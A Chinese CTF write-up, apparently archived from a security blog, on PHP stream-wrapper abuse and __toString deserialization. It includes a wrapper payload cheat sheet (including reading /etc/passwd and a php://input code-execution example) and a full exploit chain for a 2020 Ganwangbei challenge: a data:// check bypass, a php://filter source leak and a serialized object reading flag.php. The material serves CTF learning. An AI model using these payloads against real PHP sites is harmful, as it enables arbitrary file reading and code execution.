---
title: PHP伪协议与反序列化利用
description: 系统梳理 PHP 伪协议（php://filter、php://input、data:// 等）利用技巧，结合 __toString 魔术方法反序列化漏洞实现任意文件读取。基于赣网杯2020题目实战复现。
category: uncategorized
tags:
- PHP
- 伪协议
- 反序列化
- __toString
- CTF
- 文件读取
date: 2020-10-01
updated: '2026-11-12'
---
## 概述

本页面系统梳理 PHP 常见伪协议的特性与利用条件，重点分析如何结合 `php://filter` 读取源码、`php://input` 与 `data://` 绕过文件内容校验，以及如何利用 `__toString` 魔术方法配合反序列化实现任意文件读取。内容基于 **赣网杯2020** 实战题目复现，归档自 [[007攻防实验室]] 微信公众号文章。

## PHP 常见伪协议速查

> 官方文档：[PHP 封装协议](https://www.php.net/manual/zh/wrappers.php)

| 协议 | 作用 | 关键条件 | 典型 Payload 示例 |
| :--- | :--- | :--- | :--- |
| **file://** | 访问本地文件系统 | 默认开启 | `file:///etc/passwd` |
| **php://filter** | 读取文件并转换编码（如 Base64） | 默认开启 | `php://filter/read=convert.base64-encode/resource=index.php` |
| **php://input** | 读取 POST 请求原始数据体 | `allow_url_include=On` | `?file=php://input` (POST: `<?php phpinfo();?>`) |
| **data://** | 将数据作为文件流读取 | `allow_url_include=On` <br> `allow_url_fopen=On` <br> PHP>=5.2.0 | `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b` |
| **zip://** | 读取压缩包内文件 | 默认开启 | `zip://path/to/img.jpg%23shell.php` |
| **zlib://** | 读取压缩流 | 默认开启 | `compress.zlib://path/to/file` |

> **注意**：`include/require` 等包含函数受 `allow_url_include` 影响；`file_get_contents/fopen` 等读取函数受 `allow_url_fopen` 影响。

## 实战复现：赣网杯2020 PHP 题目

### 题目代码审计

```php
<?php
$sz_txt = $_GET["sz_txt"];
$sz_file = $_GET["sz_file"];
$password = $_GET["password"];

if(isset($sz_txt) && (file_get_contents($sz_txt, 'r') === "welcome to jxsz")){
    echo "<br><h1>".file_get_contents($sz_txt, 'r')."</h1></br>";
    if(preg_match("/flag/", $sz_file)){
        echo "Not now!";
        exit();
    }else{
        include($sz_file); // 提示 useless.php
        $password = unserialize($password);
        echo $password;
    }
}else{
    highlight_file(__FILE__);
}
?>
```

**逻辑梳理**：
1.  **校验点**：`sz_txt` 指向的内容必须完全等于 `"welcome to jxsz"`。
2.  **过滤点**：`sz_file` 不能包含 "flag" 字符串。
3.  **包含点**：包含 `sz_file` (需引入类定义文件 `useless.php`)。
4.  **触发点**：反序列化 `password` 并直接 `echo`，触发 `__toString` 魔术方法。

### 步骤一：绕过内容校验 (构造 "welcome to jxsz")

利用伪协议让 `file_get_contents` 读取可控输入流。

#### 方案 A：`php://input` (需 POST 请求)
*   **条件**：`allow_url_include=On` (题目存在 `include` 且成功，推测开启)。
*   **操作**：GET 参数 `sz_txt=php://input`，POST Body 发送 `welcome to jxsz`。

#### 方案 B：`data://` (推荐，仅需 GET)
*   **条件**：`allow_url_include=On` 且 `allow_url_fopen=On`。
*   **操作**：Base64 编码 `"welcome to jxsz"` -> `d2VsY29tZSB0byBqeHN6`。
*   **Payload**：
    ```text
    ?sz_txt=data://text/plain;base64,d2VsY29tZSB0byBqeHN6
    ```

### 步骤二：读取类定义源码 (`useless.php`)

题目过滤了 `flag` 关键词，注释提示包含 `useless.php`。利用 `php://filter` 读取源码并 Base64 编码输出，避免 PHP 解析执行。

*   **Payload**：
    ```text
    sz_file=php://filter/read=convert.base64-encode/resource=useless.php
    ```
*   **解码后源码**：
    ```php
    <?php
    class Flag{
        public $file;
        public function __tostring(){
            if(isset($this->file)){
                echo file_get_contents($this->file);
                echo "<br>";
                return ("So cool,continue plz");
            }
        }
    }
    ?>
    ```

### 步骤三：构造反序列化利用链 (`__toString` -> 任意文件读取)

**漏洞原理**：
1.  `unserialize($password)` 还原对象。
2.  `echo $password` 将对象作为字符串输出，自动调用 `__toString()`。
3.  `__toString()` 中执行 `file_get_contents($this->file)`，可控 `$file` 属性实现任意文件读取。

**EXP 构造脚本**：
```php
<?php
class Flag{
    public $file = "flag.php"; // 目标文件
    public function __tostring(){
        if(isset($this->file)){
            echo file_get_contents($this->file);
            echo "<br>";
            return ("So cool,continue plz");
        }
    }
}
$password = new Flag();
echo serialize($password);
// 输出: O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
?>
```

**最终综合 Payload** (需同时满足三个参数)：
```text
?sz_txt=data://text/plain;base64,d2VsY29tZSB0byBqeHN6
&sz_file=useless.php                     // 必须包含类定义文件
&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

> **关键点**：`sz_file` 必须为 `useless.php` (或包含 Flag 类定义的文件)，否则反序列化时找不到类定义报错 (`__PHP_Incomplete_Class`)，无法触发 `__toString`。

## 核心知识点总结

### 伪协议组合拳
*   **`data://` + `php://filter`**：`data://` 用于注入可控字符串绕过校验；`php://filter` 用于源码泄露（绕过 `include` 执行、获取类结构）。
*   **条件依赖**：利用前必确认 `phpinfo()` 或报错回显中的 `allow_url_fopen` 与 `allow_url_include` 状态。

### 魔术方法 `__toString` 利用条件
*   **触发场景**：对象被当作字符串使用 (`echo $obj`, `print $obj`, `strval($obj)`, 字符串拼接 `$str = "prefix" . $obj`, `printf("%s", $obj)` 等)。
*   **利用链构造**：控制对象属性 -> 进入敏感函数 (`file_get_contents`, `file_put_contents`, `unlink`, SQL 查询等)。
*   **类定义可用性**：反序列化要求目标类在当前代码执行上下文中已定义 (通过 `include/require` 引入或自动加载)。

### CTF 常见反序列化魔术方法速查

| 魔术方法 | 触发时机 | 常见利用方向 |
| :--- | :--- | :--- |
| `__construct` | 对象创建 (`new`) | 初始化属性、触发其他方法 |
| `__destruct` | 对象销毁 (脚本结束/引用计数为0) | **最常用**，析构函数利用链 |
| `__toString` | 对象作为字符串使用 (`echo`/拼接) | **本题核心**，文件读取/写入/SQLi |
| `__wakeup` | `unserialize()` 成功后 | 绕过 `__wakeup` (CVE-2016-7124)、初始化属性 |
| `__sleep` | `serialize()` 之前 | 控制序列化哪些属性 |
| `__call` / `__callStatic` | 调用不存在的方法 | 链式调用中转 |
| `__get` / `__set` | 访问不可访问属性 | 属性访问代理、链式调用 |

## 关联页面

*   [[007攻防实验室]] - 文章来源归档库，包含更多 CTF 实战笔记。

## 参考资源

*   PHP 官方手册：[封装协议](https://www.php.net/manual/zh/wrappers.php)
*   PHP 官方手册：[魔术方法](https://www.php.net/manual/zh/language.oop5.magic.php)
*   赣网杯2020 Writeup 原文 (微信归档)

## 来源

- [007攻防实验室-202007-202010_2](../sources/007攻防实验室-202007-202010_2.md)
